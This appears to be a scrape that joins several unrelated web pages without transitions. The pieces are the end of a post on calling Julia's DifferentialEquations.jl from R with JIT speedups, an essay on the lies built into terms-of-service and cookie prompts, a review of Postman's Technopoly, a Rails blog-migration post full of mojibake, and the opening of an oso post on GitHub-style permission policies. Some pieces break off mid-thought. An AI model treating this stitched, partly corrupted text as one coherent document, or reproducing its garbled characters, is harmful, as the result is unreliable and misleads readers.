  du1 = p[1]*(u[2]-u[1])
  du2 = u[1]*(p[2]-u[3]) - u[2]
  du3 = u[1]*u[2] - p[3]*u[3]
  return(c(du1,du2,du3))
}
u0 &lt;- c(1.0,1.0,1.0)
tspan &lt;- c(0.0,100.0)
p &lt;- c(10.0,28.0,8/3)
prob &lt;- de$ODEProblem(f, u0, tspan, p)
sol &lt;- de$solve(prob,saveat=1.0)</pre></div></div></div></div></div></div></div>


<p>This then carries on through SDEs, DDEs, DAEs, and more. Through this direct exposing form, the whole library of DifferentialEquations.jl is at the finger tips of any R user, making it a truly cross-language platform.</p>
<p>(Note that the only caveat is that diffeq_setup requires that the user has already installed Julia and julia is included in the path. We hope that future developments can eliminate this need.)</p>
<h2>JIT compilation and symbolic analysis of ODEs and SDEs in R via ModelingToolkit.jl</h2>
<p>The reason for Julia is speed (well and other things, but here, SPEED!). Using the pure Julia library, we can solve the Lorenz equation 100 times in about 0.05 seconds:</p>


<div><div><div><div><div><div><div><pre>@<span>time</span> <span>for</span> i <span>in</span> <span>1</span>:<span>100</span> solve<span>(</span>prob,saveat=<span>1.0</span><span>)</span> <span>end</span>
<span>0.048237</span> seconds <span>(</span><span>156.80</span> k allocations: <span>6.842</span> MiB<span>)</span>
<span>0.048231</span> seconds <span>(</span><span>156.80</span> k allocations: <span>6.842</span> MiB<span>)</span>
<span>0.048659</span> seconds <span>(</span><span>156.80</span> k allocations: <span>6.842</span> MiB<span>)</span></pre></div></div></div></div></div></div></div>


<p>Using diffeqr connected version, we get:</p>


<div><div><div><div><div><div><div><pre>lorenz_solve &lt;- function (i){
  de$solve(prob,saveat=1.0)
}
&nbsp;
&gt; system.time({ lapply(1:100,lorenz_solve) })
   user  system elapsed
   6.81    0.02    6.83
&gt; system.time({ lapply(1:100,lorenz_solve) })
   user  system elapsed
   7.09    0.00    7.10
&gt; system.time({ lapply(1:100,lorenz_solve) })
   user  system elapsed
   6.78    0.00    6.79</pre></div></div></div></div></div></div></div>


<p>That's not good, that's about 100x difference! In <a href="https://www.stochasticlifestyle.com/why-numba-and-cython-are-not-substitutes-for-julia/">this blog post I described that interpreter overhead and context switching</a> are the main causes of this issue. We've also demonstrated that <a href="https://gist.github.com/ChrisRackauckas/cc6ac746e2dfd285c28e0584a2bfd320">ML accelerators like</a> <a href="https://gist.github.com/ChrisRackauckas/6a03e7b151c86b32d74b41af54d495c6">PyTorch</a> generally do not perform well in this regime since those kinds of accelerators rely on heavy array operations, unlike the scalarized nonlinear interactions seen in a lot of differential equation modeling. For this reason we cannot just slap any old JIT compiler onto the f call and then put it into the function since there would still be left over. So we need to do something a bit tricky.</p>
<p>In my <a href="https://www.youtube.com/watch?v=UNkXNZZ3hSw">JuliaCon 2020 talk, Automated Optimization and Parallelism in DifferentialEquations.jl</a> I demonstrated how <a href="https://github.com/SciML/ModelingToolkit.jl">ModelingToolkit.jl</a> can be used to trace functions and generate <a href="https://mtk.sciml.ai/dev/tutorials/auto_parallel/">highly optimized sparse and parallel code</a> for scientific computing all in an automated fashion. It turns out that JuliaCall can do a form of tracing on R functions, something that exploited to allow <a href="https://github.com/Non-Contradiction/autodiffr">autodiffr to automatically differentiate R code with Julia's AD libraries</a>. Thus it turns out that the same <a href="https://github.com/SciML/AutoOptimize.jl">modelingtoolkitization methods used in AutoOptimize.jl</a> can be used on a subset of R codes which includes a large majority of differential equation models.</p>
<p>In short, we can perform automated acceleration of R code by turning it into sparse parallel Julia code. This was exposed in diffeqr v1.0 as the `jitoptimize_ode(de,prob)` function (also `jitoptimize_sde(de,prob)`). Let's try it out on this example. All you need to do is give it the ODEProblem which you wish to accelerate. Let's take the last problem and turn it into a pure Julia defined problem and then time it:</p>


<div><div><div><div><div><div><div><pre>fastprob &lt;- diffeqr::jitoptimize_ode(de,prob)
fast_lorenz_solve &lt;- function (i){
  de$solve(fastprob,saveat=1.0)
}
&nbsp;
system.time({ lapply(1:100,fast_lorenz_solve) })
&nbsp;
&gt; system.time({ lapply(1:100,fast_lorenz_solve) })
   user  system elapsed
   0.05    0.00    0.04
&gt; system.time({ lapply(1:100,fast_lorenz_solve) })
   user  system elapsed
   0.07    0.00    0.06
&gt; system.time({ lapply(1:100,fast_lorenz_solve) })
   user  system elapsed
   0.07    0.00    0.06</pre></div></div></div></div></div></div></div>


<p>And there you go, an R user can get the full benefits of Julia's optimizing JIT compiler without having to write lick of Julia code! This function also did a few other things, like automatically defined the <a href="https://diffeq.sciml.ai/stable/tutorials/advanced_ode_example/#Automatic-Sparsity-Detection">Jacobian code to make implicit solving of stiff ODEs much faster as well</a>, and it can perform sparsity detection and automatically optimize computations on that.</p>
<p>To see how much of an advance this is, note that this Lorenz equation is the same from the <a href="http://desolve.r-forge.r-project.org/">deSolve examples page</a>. So let's take their example and see how well it performs:</p>

<p><em>Written on May 5, 2019</em></p>







<p><em>In which I muse about the consequences of how we are forced to lie when we use the internet and our gadgets.</em></p>











<p>Perhaps the ancient tribes of Judea predicted Facebook. They wrote</p>



<blockquote><p>You shall not spread a false report.</p><cite>EXODUS 23:1, first published in approx. 1446 BCE by Ancient Scholars. All rights reserved.<br></cite></blockquote>



<p>But before you read on, please confirm the following:</p>



<p> I have read and agree to your terms for reading this article.</p>



<p>Warning: if you happen to be in Burkina Faso, and you found this article using a Yahoo search through Safari, then I am afraid the people in Apple’s legal department want to talk to you. You have just violated section 16 of the agreement that you read and agreed to. (Article 16 only allows you to use Yahoo search in Argentina, Aruba, Australia, Austria, Barbados, Belgium, Bermuda, Brazil, Bulgaria, Canada, Cayman Islands, Chile, China mainland, Hong Kong, Taiwan, Colombia, Cyprus, Czech Republic, Denmark, Dominican Republic, Ecuador, El Salvador, Finland, France, Germany, Greece, Grenada, Guatemala, Hungary, Iceland, India, Indonesia, Ireland, Italy, Jamaica, Japan, Latvia, Lithuania, Luxembourg, Malaysia, Malta, Mexico, Netherlands, New Zealand, Nicaragua, Norway, Panama, Peru, Philippines, Poland, Portugal, Puerto Rico, Romania, Singapore, Slovakia, Slovenia, South Korea, Spain, St. Lucia, St. Vincent, Sweden, Switzerland, Thailand, The Bahamas, Trinidad and Tobago, Turkey, UK, Uruguay, US and Venezuela.)</p>



<p>Wait, Apple’s lawyers don’t want to talk to you:</p>



<blockquote><p><strong>6. Termination.&nbsp;</strong>This License is effective until terminated. Your rights under this License will terminate automatically or otherwise cease to be effective without notice from Apple if you fail to comply with any term(s) of this License. Upon the termination of this License, you shall cease all use of the iOS Software. Sections 4, 5, 6, 7, 8, 9, 12 and 13 of this License shall survive any such termination.</p></blockquote>



<p>Apparently, even if in a moment of weakness you agree to the terms, but then change your mind, you are still bound by sections 4 through 9 and sections 12 and 13 of the agreement. How can this make any kind of sense? By the way, most of these survival clauses are just silly. For example, notice that section 6 (Termination) remains in effect after termination. I am unable to understand what this can possibly mean. The other early clauses concern consent from you to Apple to use certain information that you have provided through use of the software. Well, even if you change your mind about this agreement, you cannot ask Apple to erase any information they (legally) gathered before you terminated the agreement. </p>



<p>Let me be clear, though, this is not to bash Apple. Their agreement is probably no different from many other agreements you have “read and agreed to”. Adobe, for example, have many agreements, and, while they are shorter and better written than the Apple ones, they have their own share of strangeness. For example, Photoshop users have agreed, section 6 paragraph c, not to:</p>



<blockquote><p>(c) use the Software to construct any kind of database;</p></blockquote>



<p>I really have no idea at all what this means. And yet I have to agree to it. Surely my collection of photographs, the very reason I use Photoshop in the first place is <em>some kind</em> of database?</p>



<p>My randomized research project (that is, travelling on the Canada Line train) reveals to me clearly that the vast majority of people who use iPhones and similar gadgets are way (and I mean a long way) younger than you and me. Let’s pick 14 year old Charles over there, happily doing something on his iPhone XS. Apparently, he read, comprehended, and agreed that:</p>



<blockquote><p>The iOS Software contains functionality that allows it to accept digital certificates either issued from Apple or from third parties. YOU ARE SOLELY RESPONSIBLE FOR DECIDING WHETHER OR NOT TO RELY ON A CERTIFICATE WHETHER ISSUED BY APPLE OR A THIRD PARTY.</p></blockquote>



<p>Or how about this:</p>



<blockquote><p>(a) The iOS Software is licensed under the MPEG-4 Systems Patent Portfolio License for encoding in compliance with the MPEG-4 Systems Standard, except that an additional license and payment of royalties are necessary for encoding in connection with (i) data stored or replicated in physical media which is paid for on a title by title basis and/or (ii) data which is paid for on a title by title basis and is transmitted to an end user for permanent storage and/or use. Such additional license may be obtained from MPEG LA, LLC. See http://www.mpegla.com for additional details.</p></blockquote>



<p>What? Charles, we need to talk. Because I don’t understand these two sections that I read and agreed to. Perhaps you can explain them to me.</p>



<p>On your behalf, dear reader, I decided to visit “mpegla.com”. This was not helpful. For one thing, my brain has become accustomed to shutting down every time I see the phrase “The world’s leading whatever” and MPEG LA, it turns out, claim to be the world’s leading “packager and provider of one stop licenses for standards and other technology platforms.”</p>



<p>Actually, I don’t think it was hard for them to make this claim, because as far as I and Professor Google can tell, they are the <strong>only</strong> such “packager and provider”. </p>



<p>Lets talk about Cookies. Due to legislation in Europe, by well meaning officials, web sites that offer content in Europe are required to obtain a users consent before storing cookies on your computer. It turns out that this bit of legislation is universally mostly ignored. If an organization wanted to be fully compliant, then the first time you visited them, you would have to land on a cookie-free page that asked your consent before you could proceed to their actual content. No one does this. Instead, there are various compromises. I like this one, placed on the bottom of the page:</p>



<blockquote><p>This website uses cookies in order to improve user experience. If you close this box or continue browsing, we will assume you agree with this. For more information about the cookies we use or to find out how you can disable cookies, click here.</p></blockquote>



<p>This is in actual violation of the law, because that web site stores a cookie whether or not you close the box. It is in violation because of Section 5, paragraph 3 of the relevant EU directive which says:</p>



<blockquote><p>3. Member States shall ensure that the use of electronic communications networks to store information or to gain access to information stored in the terminal equipment of a subscriber or user is only allowed on condition that the subscriber or user concerned is provided with clear and comprehensive information in accordance with Directive 95/46/EC, inter alia about the purposes of the processing, and is offered the right to refuse such processing by the data controller. </p></blockquote>



<p>Much worse, of course, are the sites that ask you the “I have read and accept” intrusion.</p>



<p>There is no doubt that the EU directive has not been pleasant, either for organizations with web sites, or the consumers of these sites. And, of course, not only are we reading things we <em>know</em> to be lies (<em>“This website uses cookies to improve user experience”</em>), but we are often forced to lie in order to read the web page.</p>



<p>So-called “<a href="https://en.wikipedia.org/wiki/Surveillance_capitalism">Surveillance Capitalism</a>” is forcing you, your friends, and your children to lie. Often. Perhaps we should call it Wink-Wink Capitalism. We are all complicit, know what I mean, nudge-nudge, wink-wink?</p>



<p>Now I think there are technical ways to improve cookie treatment, but I will leave that to a possible future article. What worries me mostly are the long-term psychological consequences of what has become routine lying. Of course, this kind of lying is not restricted to web pages. Do you believe this:</p>



<blockquote><p>Please listen carefully, as our menu options have changed</p></blockquote>



<p>Really? When?</p>



<p>Or this:</p>



<blockquote><p>Due to higher than expected call volumes, there may be a longer than usual delay</p></blockquote>



<p>How about this recent press release:</p>



<blockquote><p>Today Hootsuite communicated organizational changes in order to drive greater alignment with our growing company’s strategic priorities that best serve our customers. Unfortunately, this included some reductions to our staff.</p></blockquote>



<p>Perhaps this gives new meaning to the phrase “half-truth” – the part about “reductions”, also known as termination of employment, is true.</p>



<p>Most of us grew up with the belief that telling the truth was important. We were allowed some exceptions, called “white lies”, mostly if it seemed necessary to avoid inflicting unnecessary hurt.</p>



<p>Sadly, the internet has habituated us to lying. If you are someone who has actually read the terms and conditions of every piece of software before you checked the box, then… I don’t believe you. It just is not reasonable to expect you to do this. </p>



<p>The question that I leave you with is simply this. Can we do better?</p>

        <h3>Book Review: Technopoly
        </h3>
        
        </p>

    <!-- raw HTML omitted -->
<p>In <em>Technopoly: The Surrender of Culture to Technology</em>, Neil Postman argues that our infatuation with technology has insidiously eroded our culture. We gain much through technology, but it comes at a price; all too often we are blind to that price. This book seeks to call attention to the costs of a technology-focused society. I felt this poignantly because I, as a technology worker, know what that infatuation feels like.</p>
<p>This book review will be pretty limited in scope: I’ll only talk about new insights that I got from the book, as well as a few points that I disagreed with. I encourage everyone to read the book: the book itself will do a much better job of telling you what it’s about than I will! This post, then, should be regarded as an artifact of me trying to make sense of what I read, rather than a comprehensive analysis of the book.</p>
<h2 id="book-introduction">Book Introduction</h2>
<p>For those of you who haven’t yet read <em>Technopoly</em>, this section is a meager summary of some of the points I’ll touch on</p>
<h3 id="what-is-technology">What is “technology”?</h3>
<p>Technology is defined rather broadly in <em>Technopoly</em>: rather than just physical tools, a technique or a system can be considered a technology. For example, <em>writing</em> is a technology. In chapters 6–8 he talks about medical and computer technologies, as well as “invisible” technologies like statistics and writing.</p>
<!-- raw HTML omitted -->
<p>Technology is usually intended to serve a particular purpose: writing lets us communicate without the need to be temporally and physically proximate. Statistics help us make sense of a complex world. Technologies <em>give</em> us benefits. What Postman explores is what technologies <em>take away</em>.</p>
<p>Postman doesn’t say that technology is bad <em>per se</em>, and his argument isn’t that we should <em>stop</em> using certain technologies. Rather, he argues that we need to step back and be more conscientious in our usage:</p>
<blockquote>
<p>[We should understand] that technology must never be accepted as part of the natural order of things, that every technology—from an IQ test to an automobile to a television to ac computer—is a product of a particular economic and political context and carries with it a program, and agenda, and a philosophy that may or may not be life-enhancing and that therefore require scrutiny, criticism, and control.<br>
pp. 184–185</p>
</blockquote>
<p>Our culture is not inclined to think about what we <em>loose</em> by adopting a particular technology. Why should it? To say that a particular technology comes with some costs (besides those of a pecuniary nature) doesn’t sell well. Moreover, most of us are just flat-out blind to the costs of technology.</p>
<h3 id="what-does-technology-do">What does technology do?</h3>
<p>Postman outlines three broad effects of technology:</p>
<ul>
<li>
<p><strong>Technology restructures our interests</strong>: a tool or technique might change what we might think about. Facebook, Instagram, Twitter, etc. can make us more interested in creating <em>engaging or entertaining</em> content, rather than <em>quality work</em>.</p>
</li>
<li>
<p><strong>Technology changes our symbols</strong>: technology can change how we think about things—it can reassign value and change how we perceive the world. Bureaucracies often push for greater efficiency <em>because efficiency is perceived as intrinsically good</em>.</p>
</li>
<li>
<p><strong>Technology alters our community</strong>: Twitter is a great example of how technology alters the <em>arena in which ideas are created and debated</em>. But this happened even before the internet: the telegraph brought together disparate parts of the world and blended their conversations.</p>
</li>
</ul>
<h2 id="the-value-shift">The Value Shift</h2>
<p>What I found most interesting in Postman’s book is his exploration of how technology can alter our values. He’s careful to point out that a change in values is not necessarily bad—some values <em>need</em> adjustment—but what is problematic is that we might not recognize what values are shifting.</p>
<p>To clarify what values are shifting, Postman writes:</p>
<blockquote>
<p>These include the beliefs that the primary, if not the only, goal of human labor and thoughts is efficiency; that technical calculation is an all respects superior to human judgment; that in fact human judgment cannot be trusted, because it is played by laxity, ambiguity, and unnecessary complexity; that subjectivity is an obstacle to clear thinking; that <em>what cannot be measured either does not exist or is of no value</em>; and that the affairs of citizens are best guided and conducted by experts.<br>
pp. 51 (emphasis mine)</p>
</blockquote>
<p>The ramifications of this are multifaceted; I cannot hope to go into them all here. Instead, I’ll give one example of this shift at work: Facebook.</p>
<h3 id="facebooks-premise-is-stupid">Facebook’s premise is stupid</h3>
<!-- raw HTML omitted -->
<p>Facebook bills itself as a social network. I take issue with the <em>social</em> bit of that moniker. Human connection does not happen in a virtual world. Our species has been forming communities for millennia by getting together in the real world. Facebook wanting to help “create connection” is a solution in search of a problem.</p>
<p>Facebook isn’t the only company that makes a big deal out of these kinds of “innovations”: I follow Apple’s keynotes, and they always talk about how there are “great new ways” to “share and connect” with your friends. While sharing digital photos is a new phenomenon, this idea of connecting—not electronically, but in the human sense—requires no new technology. It’s easy to get caught up in the frenzy of “the latest new thing”, but once you wipe away the chrome, there’s surprisingly little substance underneath.</p>
<p>Facebook touts “community” and “connecting people” as intrinsically valuable things. But are they? Not too long ago I read this in <a href="https://arstechnica.com/tech-policy/2020/06/facebook-pulls-trump-campaign-ads-for-featuring-nazi-associated-image/"><em>Ars Technica</em></a>:</p>
<blockquote>
<p>Accusing Facebook’s algorithm of “promoting hatred and anger,” Himes added, “You keep using the word ‘community’ and ‘authentic.’ Those are value-neutral words. There is nothing good or bad about authenticity or good or bad about community.” Indeed, he went on, “community” can be explicitly bad.</p>
</blockquote>
<p><em>Technopoly</em> points out the general phenomenon going on here: technology (and technology-centric companies’ marketing departments!) push us to value things that technology can accomplish: we value machines and processes that are “faster” or “more efficient”, but we ask whether or not these new technologies add meaningful value far too infrequently.</p>
<p>I will add here that, amidst a pandemic, platforms like Facebook do truly add some value because we cannot meet together safely as we usually would. If anything, the way this pandemic has forced us to rely on digital facsimiles of in-person interaction should help us value the intrinsically and irreplaceable human qualities of what society, connection, and friendship <em>really</em> are.</p>
<h3 id="not-everything-that-counts-can-be-counted">Not everything that counts can be counted…</h3>
<p>Statistics is another tool that Postman discusses in his book. I won’t go too into depth here, but continuing on with the Facebook example, consider the case of “friends” and “likes”: these numbers serve as measures for how popular one is or how engaging someone’s blurb/photo/whatever is. Do these numbers measure anything of value? I think it’s hard to argue that they do. They are simplified, watered-down metrics that are <em>easy</em> to measure and compare. Because it’s easy to measure and compare these numbers, we’ve attached some value to them.</p>
<p>I guess if you’re an advertiser,<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup> those metrics can give you some idea of whether or not your ad campaign is working. But Facebook doesn’t advertise (har har) itself to ordinary users as an ad platform. It says that it’s a social network, and then gamifies acquiring “friends” and making “connections”. But in real relationships, quality trumps quantity. People with a few good friends are happier than those with only a thousand acquaintances. <em>But because of the presence and ease of use of these metrics, we have imputed value to them.</em></p>

<!-- raw HTML omitted -->
<p>Facebook isn’t the only technology to emerge in recent years that represents a fundamental value shift. There are others too. Consider Twitter: so much dialog happens on Twitter, and the tacit philosophy behind Twitter seems to be that you can have meaningful discussions when limited to 280 characters.</p>
<p>It’s not <em>inevitable</em> that we think that way, but the technology of tweets tends to direct our dialog in that way.</p>
<p>Twitter is not the only technology that’s had a degrading effect on our public discourse: Postman makes a compelling argument in <em>Amusing Ourselves to Death</em> that television—and if he had lived to see it, he would have argued that the Internet as it is today—has had an insidious effect on our dialog.</p>
<!-- raw HTML omitted -->
<p>Postman is somewhat pessimistic about our prognosis. I’m a little more hopeful that individuals will be able to master technology rather than letting it master them. I agree, however, that it is difficult; to this end, Postman offers a few points of advice:</p>
<blockquote>
<p>Those who resist the American Technopoly are people</p>
<p>…who refuse to accept efficiency as the pre-eminent goal of human relations;</p>
<p>…who are, at least, suspicious of the idea of progress, and who do not confuse information with understanding;</p>
<p>who do not regard the aged as irrelevant;…<br>
pp. 183–184</p>
</blockquote>
<p>There’s a lot more in there that I can’t put down here. Go read the book yourself.</p>
<h2 id="conclusions">Conclusions</h2>
<!-- raw HTML omitted -->
<p>Reading this book has made me think about how <em>I</em> use and interact with technology. I <a href="https://ashton.wiersdorf.org/posts/2018-06-23-leaving-facebook/">abandoned Facebook</a> over two years ago,<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup> so no changes on that front.</p>
<p>I try and read from the Bible or the <a href="https://www.churchofjesuschrist.org/study/scriptures/bofm/title-page">Book of Mormon</a> every morning, and I like taking notes about what I read. I used to take notes with a pen and a notebook, but I switched to digital notes about two years ago. Recently I noticed that I started spending a lot of time working on maintaining all my cross references and indexes, rather than devoting that time to actual study. I decided to be a little more conscientious about how I use my time: I’ve since limited interaction with my computer to reviewing the study plan that I’ve set for myself. Once I’ve gone over my plan, I sit down a short distance away from my laptop and just read a hard copy of the scriptures.</p>
<p>Why did I start using digital notes in the first place? I wanted all my notes to be indexable and searchable. That has been nice, but <em>Technopoly</em> got me thinking about why …</p></div></div>

<p>Iâ€™ve moved my Jekyll site into a Rails app, and Iâ€™ve done just enough work to have every post render without errors and added just enough style to make things readable. Some of the site still looks pretty bad, and none of it looks good yet. But thatâ€™s ok, because my plan is to rebuild and redesign the site <a href="https://bradfrost.com/blog/post/designing-in-the-open/">in the open</a>. Iâ€™d love to hear your feedback as I go - I havenâ€™t built out the comments feature yet, so for now please feel free to <a href="https://calebhearth.com/cdn-cgi/l/email-protection#426d6d21232e27200221232e27202a272330362a6c212d2f">email</a> me at &lt;caleb at this domain&gt; or reach out/follow on <a href="https://twitter.com/calebthompson">Twitter</a>! The first post in the <a href="https://calebhearth.com/categories/rebuild-in-the-open">Rebuild in the Open</a> series, <a href="https://calebhearth.com/css-submenu-navigation">CSS-only Submenu Navigation with Post Tags</a> is also up. It looks at how I use the front matter tags in my posts to generate the new top nav automatically, with a HTML- and CSS-only accessible menu with submenus to display the nav.</p>

<p>I originally chose Jekyll because I could deploy it for free on GitHub Pages. When I started this site in 2013, it included a few â€œblog postsâ€� Iâ€™d written around the Internet, and I was excited about an idea for a new post on <a href="https://calebhearth.com/how-to-write-a-readme">writing READMEs</a>. It was a fun, week-long project to build out, and since then Iâ€™ve <a href="https://calebhearth.com/tags/jekyll">tinkered</a> with it over the years, eventually <a href="https://calebhearth.com/jekyll-on-heroku">moving it onto Herkou</a> so that I could run some custom plugins, which GitHub didnâ€™t support.</p>
<p>I canâ€™t remember where I heard it, but Iâ€™ve always heard that building a blog in Rails, despite being the focus of the â€œRails blog in 15 minutes <a href="https://youtu.be/Gzj723LkRJY">video</a>, isnâ€™t a great idea. Things like â€œthereâ€™s no good off-the-shelf Rails blogâ€� and â€œRails is overkill for a blogâ€�. In my opinion, neither of those are true, and I think that the multiple Rails blogging engines available would agree. Iâ€™ve also heard that Wordpress or Medium are better options. That might be true for those without time or skill to build a site, but I think that given the opportunity, a web developer or designer having a space where they can show their skill and personality is a boon. Why did I pick Ruby and Rails instead of some other option? Simply, itâ€™s the language and framework Iâ€™m most comfortable with and it offers a lot of flexibility and speed. Of course, I didnâ€™t consider that it would take me weeks to figure out how to integrate rendering of Jekyll-style Liquid, Markdown, and yaml front matter into a Rails app, but as Kent Beck <a href="https://twitter.com/KentBeck/status/250733358307500032">said</a>, â€œfirst make the change easy (warning: this might be hard), then make the easy change.â€�</p>

<ul>
<li><strong>Use existing markdown with frontmatter files for posts.</strong> I didnâ€™t want to have to manually move these files into some other format. This means that I needed to figure out how to extract the front matter from posts, render the rest of the page, and use not only Liquid but Jekyllâ€™s particular flavor of liquid which includes some changes, notably to the include tag. Thereâ€™ll be at least one post on how I did that, but for now I have open-sourced an early version of a gem to <a href="https://github.com/calebthompson/frontmatter">extract the front matter</a> named Frontmatter.</li>
<li><strong>Donâ€™t break existing post links.</strong> My site isnâ€™t super heavily trafficked, but I do get about 300 hits per day, many from links from other blogs, Twitter, forums, and Slack. When I moved from calebthompson.io to calebhearth.com this year, I did as much as I could to reach out to these places to update their links (though there is a redirect in place for now), and I donâ€™t want to miss out on these visits or need to go through that process again.</li>
<li><strong>Use semantic markup and donâ€™t do something in JavaScript that HTML and CSS can handle.</strong> This is maybe a little silly, but itâ€™s a thing Iâ€™ve tried to do for a long time, and if nothing else itâ€™s an entertaining constraint that helps me to learn.</li>
<li><strong>Make it (nearly?) as fast as the static pages I had before.</strong> Performance matters, and it shouldnâ€™t need to be a tradeoff I make to move from a static site to Rails. I think itâ€™s likely that with both in-app and eventually edge caching, this iteration can be faster than the old one.</li>
<li><strong>Write up the interesting bits of the design and development as I go.</strong> Whatâ€™s the point of having a blog if it doesnâ€™t get used? Here is a spark chart of number of posts by year since 2013, old to new: <span title="2013: 17">â–ˆ</span><span title="2014: 5">â–‚</span><span title="2015: 2">â–�</span><span title="2016: 3">â–�</span><span title="2017: 4">â–‚</span><span>â–ƒ</span><span title="2019: 2">â–�</span><span title="2020: 9">â–„</span>. I have plenty of ideas for things to write, and having this goal will hopefully give me a chance to increase the right side of that chart.</li>
<li><strong>Make sure that the <a href="https://calebhearth.com/dnd-races">D&amp;D Ancestries</a> and <a href="https://calebhearth.com/dnd-classes">D&amp;D Classes</a> pages look good.</strong> These pages account for the majority of the traffic on my site. Itâ€™s mostly organic search traffic, so I donâ€™t want the Google bot to decide the page is unusable and lower my page rank. While for most content it doesnâ€™t matter as much that it looks good today (it should in the future of course), I donâ€™t think the overlap of interest in Programming and D&amp;D content is very large, so the latter community (who would more likely be seeing these posts) should look at least as good as they did on the old site.</li>
<li><strong>Build the tooling in a way that it could be open sourced</strong> Whether or not this happens, I canâ€™t promise, but building things to be open source means that you give them more consideration, and if they are released at some point, thatâ€™s even better. As I mentioned, [Frontmatter][extract the frontmatter] has already been released in an early form. See below for more ideas on this goal.</li>
<li><strong>Responsive</strong> My previous site had usability and readability issues on mobile. Iâ€™m hoping that with a fresh start on styles, I can avoid that issue this time around.</li>
<li><strong>Provide separate Programming and D&amp;D feeds</strong> My content is starting to diversify from mostly programming to a mix of programming and D&amp;D. I should provide landing pages and RSS feeds for different tags so that people can opt into what theyâ€™re interested in.</li>
</ul>

<p>These are features I intend to build out for the blog, and which Jekyll wouldnâ€™t have been very friendly to building. As I build these out, Iâ€™ll do it in a way that could be extracted and released for others to use.</p>
<ul>
<li><strong>Have webmention-based commenting system.</strong> I think open standards are important, as is owning your own content (another reason I donâ€™t want to use Medium). Webmention is a really interesting idea where when you comment/like/link to another site, you send a notice to that site with a link to your content and a link to the content youâ€™re referencing. The original site can then do whatever with that info, including posting your comment for others to view. Iâ€™m working on a gem to bring Webmention functionality into Rails for any page.</li>
<li><strong>A gem to fetch my Book and Film reviews from elsewhere</strong> I pull my Goodreads and Letterboxed data into <a href="https://calebhearth.com/books">books</a> and <a href="https://calebhearth.com/films">films</a> pages that show my star ratings and reviews. While these were present on the old site, I donâ€™t think anyone ever looked at them and they werenâ€™t updated very frequently because that was necessarily a part of the build process, which was only run as often as I updated the site.</li>
<li><strong>Jekyll-style frontmatter/markdown/liquid rendering</strong> I have a couple classes currently doing this, and while itâ€™s currently too entangled with the assumptions of my app, Iâ€™d like to clean them up and release them for others.</li>
<li><strong>Bundle it all up</strong> A Rails engine that will bring these other gems together into a similar blogging â€œplatformâ€� to this one. It will include instructions and/or tools to make migration from Jekyll into Rails easier, should others be interested in making that jump.</li>
</ul>
<p>I hope to hear from you what you think, whether youâ€™d use any of these gems, and what youâ€™re interested in hearing about in redesigning a site from scratch or building a Rails blog. Once again, you can <a href="https://calebhearth.com/cdn-cgi/l/email-protection#321d1d51535e57507251535e57505a575340465a1c515d5f">email</a> me at &lt;caleb at this domain&gt; or find me on Twitter.</p>

August 27, 2020 | https://www.osohq.com/post/building-the-github-authorization-model-using-oso | <a href="https://web.archive.org/web/*/https://www.osohq.com/post/building-the-github-authorization-model-using-oso">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>When the oso team first started tackling problems in the authorization space, we looked to GitHub permissions as a canonical example of the not-so-simple authorization patterns that can quickly become overwhelming to maintain in application code.</p><p>GitHub provides a pure example of what motivates authorization in the first place—securing access to resources. In GitHub, the resources are repositories<strong>,</strong> and users may or may not be able to take certain actions on them. Repositories may be created, destroyed, read, or edited in any number of ways, and have child resources (issues, wikis, branches, etc.) whose access control is related to that of their parent resource. And permissions hierarchies are not limited to resources. Users can be grouped into organizations, and further grouped into teams and sub-teams, which complicates the business of controlling access even more.</p><p>In this post, we'll show how to incrementally build complex policies with oso. We'll use GitHub's authorization model as an example, but the patterns we cover, including ownership, hierarchical permissions, and nested resources, are common to many user-facing applications.</p><p><strong>Note:</strong> this post will focus on oso policies and authorization logic<em>, </em>and won't go into detail on how use the oso library. For more information on this, see our <a href="https://docs.osohq.com/getting-started/application/index.html" target="_blank">guide</a> on adding oso to your application. As of this writing, oso's <a href="https://docs.osohq.com/using/libraries/index.html" target="_blank">open-source libraries</a> are available in Python, Ruby, Java and Node.js.</p><h4>A note on GitHub permissions</h4><p>Permissions in GitHub revolve around managing access to repositories. If you're unfamiliar with GitHub permissions, you can find a nice overview <a href="https://docs.github.com/en/github/getting-started-with-github/access-permissions-on-github" target="_blank">here</a>.</p><h3>Basic access: owners and collaborators</h3><figure><p><img src="https://uploads-ssl.webflow.com/5f1483105c9a72fd0a3b662a/5f4677cc06628a2d540eb123_Untitled.png" alt=""></p></figure><p>Let's start with GitHub's simplest authorization use case: user accounts and repositories. If I sign into my personal GitHub account and create a repository, I am the <strong>owner</strong> of that repository. To understand what this means, let's look at the permissions available for user-owned repositories:</p><ul role="list"><li>Admin</li><li>Write</li><li>Read</li></ul><p>These three permission levels determine every action someone can take on a user-owned repository. As the owner, I get {% c-line %}"ADMIN"{% c-line-end %} privileges, which means I can do <em>whatever I want</em> to my repository. {% c-line %}"WRITE"{% c-line-end %} goes to <strong>collaborators,</strong> which we'll talk about in a minute. And if the repository is public, the rest of the world gets to {% c-line %}"READ"{% c-line-end %} it, whether or not they are even logged in. </p><p>Let's look at what these rules might look like in an <a href="https://docs.osohq.com/getting-started/policies/index.html" target="_blank">oso policy</a>. The policy below, like all oso policies, is written in a declarative policy language called Polar.</p><div><p>{% c-block language="polar" %}<br># Owners can take any action on their own repositories.<br>allow(actor: User, _action, resource: Repository) if<br>&nbsp;&nbsp;&nbsp;&nbsp;permission(actor, "ADMIN", resource);</p><p># Organization owners are admins of all organization repositories.<br># Repository owners are admins of their own repositories. <br>permission(actor: User, "ADMIN", resource: Repository) if	<br>&nbsp;&nbsp;&nbsp;&nbsp;role(actor, "OWNER", resource);</p><p># Rule specifying repository ownership, <br># based on data stored on application objects.<br>role(actor: User, "OWNER", resource: Repository) if<br>&nbsp;&nbsp;&nbsp;&nbsp;resource.owner matches User{id: actor.id};</p><p># Anyone can read a public repository.<br>permission(_actor, "READ", resource: Repository) if<br>&nbsp;&nbsp;&nbsp;&nbsp;not resource.isPrivate;<br>{% c-block-end %}</p></div><p>We've created a couple different kinds of rules here. The standard oso <a href="https://docs.osohq.com/more/glossary.html#allow-rules" target="_blank">allow</a> rule is the starting point for evaluating any authorization request. </p><p>We can name our other rules whatever we want, and we've defined them to match GitHub's terminology. We're using {% c-line %}role{% c-line-end %} rules to specify the <strong>role</strong> of a user with respect to a particular resource (i.e., owner of a Repository), and permission to specify a user's permission level (i.e. read). We'll use these supplementary rules when we add more 